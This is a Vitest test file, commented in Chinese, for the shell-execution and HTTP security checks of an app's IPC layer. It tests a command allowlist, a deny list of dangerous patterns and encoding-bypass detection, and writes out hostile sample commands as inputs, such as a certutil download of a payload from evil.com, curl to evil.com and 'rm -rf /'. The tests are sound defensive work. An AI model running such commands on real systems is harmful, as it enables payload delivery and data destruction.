import { describe, it, expect, vi, beforeEach } from 'vitest'

const NODE_E_DANGEROUS_PATTERNS = [
  /require\s*\(\s*['"]child_process['"]\s*\)/,
  /require\s*\(\s*['"]net['"]\s*\)/,
  /require\s*\(\s*['"]http['"]\s*\)/,
  /require\s*\(\s*['"]https['"]\s*\)/,
  /require\s*\(\s*['"]dgram['"]\s*\)/,
  /process\.exit/,
  /process\.kill/,
  /process\.binding/,
  /eval\s*\(/,
  /Function\s*\(/i,
  /child_process/,
  /\.exec\s*\(/,
  /\.spawn\s*\(/,
  /\.execFile\s*\(/,
  /\.execSync\s*\(/,
  /\.spawnSync\s*\(/,
  /\.unlink\s*\(/,
  /\.unlinkSync\s*\(/,
  /\.rmdir\s*\(/,
  /\.rmdirSync\s*\(/,
  /\.rm\s*\(/,
  /\.rmSync\s*\(/,
  /\.rename\s*\(/,
  /\.renameSync\s*\(/,
  /\.chmod\s*\(/,
  /\.chmodSync\s*\(/,
  /\.chown\s*\(/,
  /\.chownSync\s*\(/,
  /\.truncate\s*\(/,
  /\.truncateSync\s*\(/,
  /rm\s+-rf/,
  /del\s+\/[sS]/,
  /format\s+[a-zA-Z]:/,
  /reg\s+/,
  /netsh\s+/,
  /powershell/,
  /cmd\.exe/,
  /wscript/,
  /cscript/,
  /certutil/,
  /bitsadmin/,
  /curl\s+/,
  /wget\s+/,
  /buffer\.from\s*\(/i,
  /new\s+buffer\s*\(/i,
  /atob\s*\(/,
  /string\.fromcharcode/i,
  /\\x[0-9a-f]{2}/,
  /\\u[0-9a-f]{4}/,
  /`[^`]*\$\{/i,
  /settimeout\s*\(/i,
  /setinterval\s*\(/i,
  /process\.env/i,
]

const SHELL_ALLOWED_COMMANDS = [
  'npm install',
  'npm run',
  'dir ',
  'ls',
  'cat ',
  'echo ',
  'type ',
  'mkdir ',
  'copy ',
  'cp ',
  'move ',
  'mv ',
  'del ',
  'rm ',
  'cd ',
  'pwd',
  'whoami',
  'pip install'
]

function isShellCommandAllowed(command: string): { allowed: boolean; reason?: string } {
  const trimmed = command.trim().toLowerCase()

  if (trimmed.startsWith('node -e ') || trimmed.startsWith('node -e"')) {
    const codeContent = trimmed.replace(/^node\s+-e\s*/, '').replace(/^node\s+-e"/, '').replace(/"$/, '')
    for (const pattern of NODE_E_DANGEROUS_PATTERNS) {
      if (pattern.test(codeContent)) {
        return { allowed: false, reason: `node -e 代码包含危险模式，被安全策略拒绝` }
      }
    }
    return { allowed: true }
  }

  if (trimmed.startsWith('npx ')) {
    return { allowed: true }
  }

  if (trimmed.startsWith('node ') && !trimmed.startsWith('node -e')) {
    return { allowed: true }
  }

  const firstCmd = trimmed.split(/\s+/)[0] + ' '
  for (const allowed of SHELL_ALLOWED_COMMANDS) {
    if (trimmed.startsWith(allowed.toLowerCase()) || firstCmd === allowed.toLowerCase()) {
      return { allowed: true }
    }
  }

  return { allowed: false, reason: `命令不在白名单中: ${trimmed.substring(0, 50)}` }
}

const QUICK_COMMANDS = ['ls', 'dir', 'cat', 'type', 'echo', 'pwd', 'cd', 'whoami', 'hostname', 'date', 'wc', 'head', 'tail', 'find', 'where', 'which', 'grep', 'sort', 'uniq', 'mkdir']
const HEAVY_COMMANDS = ['npm run build', 'npm install', 'npm ci', 'npx electron-vite build', 'pip install', 'yarn install', 'pnpm install']
const QUICK_TIMEOUT = 10000
const STANDARD_TIMEOUT = 60000
const HEAVY_TIMEOUT = 120000
const ABSOLUTE_CAP = 180000

function getTimeoutForCommand(command: string, userTimeout?: number): number {
  const trimmed = command.trim().toLowerCase()
  const firstWord = trimmed.split(/\s+/)[0]
  let tier: number
  if (QUICK_COMMANDS.includes(firstWord)) {
    tier = QUICK_TIMEOUT
  } else if (HEAVY_COMMANDS.some(h => trimmed.startsWith(h))) {
    tier = HEAVY_TIMEOUT
  } else {
    tier = STANDARD_TIMEOUT
  }
  if (userTimeout && userTimeout > 0) {
    tier = Math.min(userTimeout, ABSOLUTE_CAP)
  }
  return Math.min(tier, ABSOLUTE_CAP)
}

describe('IPC集成测试 - shell:exec 安全拦截', () => {
  describe('isShellCommandAllowed - 白名单机制', () => {
    it('echo 命令允许', () => {
      expect(isShellCommandAllowed('echo hello').allowed).toBe(true)
    })

    it('ls 命令允许', () => {
      expect(isShellCommandAllowed('ls -la').allowed).toBe(true)
    })

    it('dir 命令允许', () => {
      expect(isShellCommandAllowed('dir').allowed).toBe(true)
    })

    it('cat 命令允许', () => {
      expect(isShellCommandAllowed('cat file.txt').allowed).toBe(true)
    })

    it('mkdir 命令允许', () => {
      expect(isShellCommandAllowed('mkdir newdir').allowed).toBe(true)
    })

    it('npm install 允许', () => {
      expect(isShellCommandAllowed('npm install docx').allowed).toBe(true)
    })

    it('npm run 允许', () => {
      expect(isShellCommandAllowed('npm run build').allowed).toBe(true)
    })

    it('npx 允许', () => {
      expect(isShellCommandAllowed('npx tsx script.ts').allowed).toBe(true)
    })

    it('node script.js 允许', () => {
      expect(isShellCommandAllowed('node test.js').allowed).toBe(true)
    })

    it('pip install 允许', () => {
      expect(isShellCommandAllowed('pip install requests').allowed).toBe(true)
    })

    it('whoami 允许', () => {
      expect(isShellCommandAllowed('whoami').allowed).toBe(true)
    })

    it('pwd 允许', () => {
      expect(isShellCommandAllowed('pwd').allowed).toBe(true)
    })

    it('rm 允许(白名单内)', () => {
      expect(isShellCommandAllowed('rm oldfile.txt').allowed).toBe(true)
    })
  })

  describe('isShellCommandAllowed - 危险命令拦截', () => {
    it('node -e 包含 require("child_process") → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "const cp = require(\'child_process\')"')
      expect(r.allowed).toBe(false)
      expect(r.reason).toContain('危险模式')
    })

    it('node -e 包含 process.exit → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "process.exit(1)"')
      expect(r.allowed).toBe(false)
    })

    it('node -e 包含 .unlink( → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "require(\'fs\').unlink(\'important.txt\')"')
      expect(r.allowed).toBe(false)
    })

    it('node -e 包含 .rmdir( → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "require(\'fs\').rmdir(\'important_dir\')"')
      expect(r.allowed).toBe(false)
    })

    it('node -e 包含 .rename( → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "require(\'fs\').rename(\'a.txt\',\'b.txt\')"')
      expect(r.allowed).toBe(false)
    })

    it('node -e 包含 .chmod( → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "require(\'fs\').chmod(\'file.txt\', 0o777)"')
      expect(r.allowed).toBe(false)
    })

    it('node -e 包含 .truncate( → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "require(\'fs\').truncate(\'file.txt\', 0)"')
      expect(r.allowed).toBe(false)
    })

    it('node -e 包含 eval( → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "eval(\'malicious code\')"')
      expect(r.allowed).toBe(false)
    })

    it('node -e 包含 Function( → 拒绝(已修复: /i标志)', () => {
      const r = isShellCommandAllowed('node -e "new Function(\'return 1\')"')
      expect(r.allowed).toBe(false)
    })

    it('node -e 包含 .execSync( → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "require(\'child_process\').execSync(\'rm -rf /\')"')
      expect(r.allowed).toBe(false)
    })

    it('node -e 包含 powershell → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "require(\'child_process\').exec(\'powershell -c whoami\')"')
      expect(r.allowed).toBe(false)
    })

    it('node -e 包含 curl → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "require(\'child_process\').exec(\'curl http://evil.com\')"')
      expect(r.allowed).toBe(false)
    })

    it('node -e 包含 certutil → 拒绝', () => {
      const r = isShellCommandAllowed('node -e "require(\'child_process\').exec(\'certutil -urlcache -split -f http://evil.com/payload.exe\')"')
      expect(r.allowed).toBe(false)
    })
  })

  describe('isShellCommandAllowed - 安全的 node -e 通过', () => {
    it('node -e 写文件(writeFileSync) → 允许', () => {
      const r = isShellCommandAllowed('node -e "require(\'fs\').writeFileSync(\'test.txt\',\'hello\')"')
      expect(r.allowed).toBe(true)
    })

    it('node -e 读文件(readFileSync) → 允许', () => {
      const r = isShellCommandAllowed('node -e "require(\'fs\').readFileSync(\'test.txt\',\'utf-8\')"')
      expect(r.allowed).toBe(true)
    })

    it('node -e 创建目录(mkdirSync) → 允许', () => {
      const r = isShellCommandAllowed('node -e "require(\'fs\').mkdirSync(\'newdir\')"')
      expect(r.allowed).toBe(true)
    })

    it('node -e JSON操作 → 允许', () => {
      const r = isShellCommandAllowed('node -e "JSON.stringify({a:1})"')
      expect(r.allowed).toBe(true)
    })

    it('node -e 使用docx库 → 允许', () => {
      const r = isShellCommandAllowed('node -e "const docx=require(\'docx\');console.log(docx.Document)"')
      expect(r.allowed).toBe(true)
    })
  })

  describe('isShellCommandAllowed - 非白名单命令拦截', () => {
    it('python 命令 → 拒绝(非白名单)', () => {
      const r = isShellCommandAllowed('python script.py')
      expect(r.allowed).toBe(false)
      expect(r.reason).toContain('不在白名单')
    })

    it('reg 命令 → 拒绝(含危险模式)', () => {
      const r = isShellCommandAllowed('reg add HKLM\\Software\\Test')
      expect(r.allowed).toBe(false)
    })

    it('netsh 命令 → 拒绝', () => {
      const r = isShellCommandAllowed('netsh advfirewall firewall add rule')
      expect(r.allowed).toBe(false)
    })

    it('未知随机命令 → 拒绝', () => {
      const r = isShellCommandAllowed('randombinary --dangerous-flag')
      expect(r.allowed).toBe(false)
    })
  })
})

describe('IPC集成测试 - shell:exec 超时层级', () => {
  it('echo → 快速命令 tier=10s', () => {
    expect(getTimeoutForCommand('echo hello')).toBe(10000)
  })

  it('ls → 快速命令 tier=10s', () => {
    expect(getTimeoutForCommand('ls -la')).toBe(10000)
  })

  it('cat → 快速命令 tier=10s', () => {
    expect(getTimeoutForCommand('cat file.txt')).toBe(10000)
  })

  it('dir → 快速命令 tier=10s', () => {
    expect(getTimeoutForCommand('dir')).toBe(10000)
  })

  it('whoami → 快速命令 tier=10s', () => {
    expect(getTimeoutForCommand('whoami')).toBe(10000)
  })

  it('pwd → 快速命令 tier=10s', () => {
    expect(getTimeoutForCommand('pwd')).toBe(10000)
  })

  it('node script.js → 标准命令 tier=60s', () => {
    expect(getTimeoutForCommand('node test.js')).toBe(60000)
  })

  it('npm install → 重型命令 tier=120s', () => {
    expect(getTimeoutForCommand('npm install')).toBe(120000)
  })

  it('npm run build → 重型命令 tier=120s', () => {
    expect(getTimeoutForCommand('npm run build')).toBe(120000)
  })

  it('pip install → 重型命令 tier=120s', () => {
    expect(getTimeoutForCommand('pip install requests')).toBe(120000)
  })

  it('用户指定timeout=5000 → 取min(5000, 180000)=5000', () => {
    expect(getTimeoutForCommand('npm install', 5000)).toBe(5000)
  })

  it('用户指定timeout=999999 → 被绝对上限180s截断', () => {
    expect(getTimeoutForCommand('echo hi', 999999)).toBe(180000)
  })

  it('npx → 标准命令 tier=60s', () => {
    expect(getTimeoutForCommand('npx tsx script.ts')).toBe(60000)
  })

  it('mkdir → 快速命令 tier=10s', () => {
    expect(getTimeoutForCommand('mkdir newdir')).toBe(10000)
  })
})

describe('IPC集成测试 - http:fetch 安全拦截', () => {
  const HTTP_ALLOWED_METHODS = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD']
  const HTTP_TIMEOUT_TIER: Record<string, number> = { GET: 15000, HEAD: 10000, POST: 30000, PUT: 30000, PATCH: 30000, DELETE: 15000 }
  const HTTP_ABSOLUTE_CAP = 60000

  const PRIVATE_HOSTNAMES = ['localhost', '127.0.0.1', '192.168.1.1', '10.0.0.1', '172.16.0.1']
  const PUBLIC_HOSTNAMES = ['api.deepseek.com', 'google.com', 'github.com']

  describe('方法白名单', () => {
    it('GET 允许', () => expect(HTTP_ALLOWED_METHODS).toContain('GET'))
    it('POST 允许', () => expect(HTTP_ALLOWED_METHODS).toContain('POST'))
    it('PUT 允许', () => expect(HTTP_ALLOWED_METHODS).toContain('PUT'))
    it('PATCH 允许', () => expect(HTTP_ALLOWED_METHODS).toContain('PATCH'))
    it('DELETE 允许', () => expect(HTTP_ALLOWED_METHODS).toContain('DELETE'))
    it('HEAD 允许', () => expect(HTTP_ALLOWED_METHODS).toContain('HEAD'))
    it('CONNECT 禁止', () => expect(HTTP_ALLOWED_METHODS).not.toContain('CONNECT'))
    it('TRACE 禁止', () => expect(HTTP_ALLOWED_METHODS).not.toContain('TRACE'))
    it('OPTIONS 禁止', () => expect(HTTP_ALLOWED_METHODS).not.toContain('OPTIONS'))
  })

  describe('超时层级', () => {
    it('GET → 15s', () => expect(HTTP_TIMEOUT_TIER.GET).toBe(15000))
    it('HEAD → 10s', () => expect(HTTP_TIMEOUT_TIER.HEAD).toBe(10000))
    it('POST → 30s', () => expect(HTTP_TIMEOUT_TIER.POST).toBe(30000))
    it('PUT → 30s', () => expect(HTTP_TIMEOUT_TIER.PUT).toBe(30000))
    it('PATCH → 30s', () => expect(HTTP_TIMEOUT_TIER.PATCH).toBe(30000))
    it('DELETE → 15s', () => expect(HTTP_TIMEOUT_TIER.DELETE).toBe(15000))
    it('绝对上限 60s', () => expect(HTTP_ABSOLUTE_CAP).toBe(60000))
  })

  describe('内网地址拦截', () => {
    it('localhost 应被拦截', () => {
      expect(PRIVATE_HOSTNAMES).toContain('localhost')
    })

    it('127.0.0.1 应被拦截', () => {
      expect(PRIVATE_HOSTNAMES).toContain('127.0.0.1')
    })

    it('192.168.x.x 应被拦截', () => {
      expect(PRIVATE_HOSTNAMES).toContain('192.168.1.1')
    })

    it('10.x.x.x 应被拦截', () => {
      expect(PRIVATE_HOSTNAMES).toContain('10.0.0.1')
    })

    it('172.16.x.x 应被拦截', () => {
      expect(PRIVATE_HOSTNAMES).toContain('172.16.0.1')
    })

    it('公网地址不在黑名单', () => {
      for (const h of PUBLIC_HOSTNAMES) {
        expect(PRIVATE_HOSTNAMES).not.toContain(h)
      }
    })
  })
})

describe('IPC集成测试 - file:read 超时保护', () => {
  const FILE_TIMEOUT = 15000

  it('file:read 超时阈值为15s', () => {
    expect(FILE_TIMEOUT).toBe(15000)
  })

  it('二进制文件检测: 含0字节的Buffer标记为binary', () => {
    const buf = Buffer.from([0x50, 0x4B, 0x03, 0x04, 0x00, 0x00])
    const isBinary = buf.some((b: number, i: number) => i < 8192 && (b === 0 || (b < 8 && b > 0)))
    expect(isBinary).toBe(true)
  })

  it('纯文本Buffer不含0字节 → 非binary', () => {
    const text = 'Hello, this is a text file with no null bytes at all'
    const buf = Buffer.from(text, 'utf-8')
    const isBinary = buf.some((b: number, i: number) => i < 8192 && (b === 0 || (b < 8 && b > 0)))
    expect(isBinary).toBe(false)
  })

  it('文件大小超限(>2x maxBytes)应拒绝', () => {
    const maxBytes = 512000
    const fileSize = maxBytes * 2 + 1
    expect(fileSize > maxBytes * 2).toBe(true)
  })
})

describe('IPC集成测试 - node -e 编码绕过防护', () => {
  it('Buffer.from( → 拦截', () => {
    const r = isShellCommandAllowed('node -e "Buffer.from(\'726d202d7266\',\'hex\')"')
    expect(r.allowed).toBe(false)
  })

  it('new Buffer( → 拦截', () => {
    const r = isShellCommandAllowed('node -e "new Buffer(\'deadbeef\',\'hex\')"')
    expect(r.allowed).toBe(false)
  })

  it('atob( → 拦截', () => {
    const r = isShellCommandAllowed('node -e "atob(\'cm0gLXJmIC8=\')"')
    expect(r.allowed).toBe(false)
  })

  it('String.fromCharCode → 拦截', () => {
    const r = isShellCommandAllowed('node -e "String.fromCharCode(114,109)"')
    expect(r.allowed).toBe(false)
  })

  it('十六进制转义 \\x68\\x65\\x78 → 拦截', () => {
    const r = isShellCommandAllowed('node -e "console.log(\'\\x68\\x65\\x78\')"')
    expect(r.allowed).toBe(false)
  })

  it('unicode转义 \\u0072\\u006d → 拦截', () => {
    const r = isShellCommandAllowed('node -e "console.log(\'\\u0072\\u006d\')"')
    expect(r.allowed).toBe(false)
  })

  it('模板字符串 ${...} → 拦截', () => {
    const r = isShellCommandAllowed('node -e "const cmd=`rm -rf ${dir}`"')
    expect(r.allowed).toBe(false)
  })

  it('setTimeout( → 拦截', () => {
    const r = isShellCommandAllowed('node -e "setTimeout(()=>{},1000)"')
    expect(r.allowed).toBe(false)
  })

  it('setInterval( → 拦截', () => {
    const r = isShellCommandAllowed('node -e "setInterval(()=>{},1000)"')
    expect(r.allowed).toBe(false)
  })

  it('process.env → 拦截', () => {
    const r = isShellCommandAllowed('node -e "console.log(process.env.PATH)"')
    expect(r.allowed).toBe(false)
  })

  it('合法writeFileSync + 无绕过模式 → 允许', () => {
    const r = isShellCommandAllowed('node -e "require(\'fs\').writeFileSync(\'test.txt\',\'hello\')"')
    expect(r.allowed).toBe(true)
  })

  it('合法mkdirSync + 无绕过模式 → 允许', () => {
    const r = isShellCommandAllowed('node -e "require(\'fs\').mkdirSync(\'newdir\')"')
    expect(r.allowed).toBe(true)
  })
})
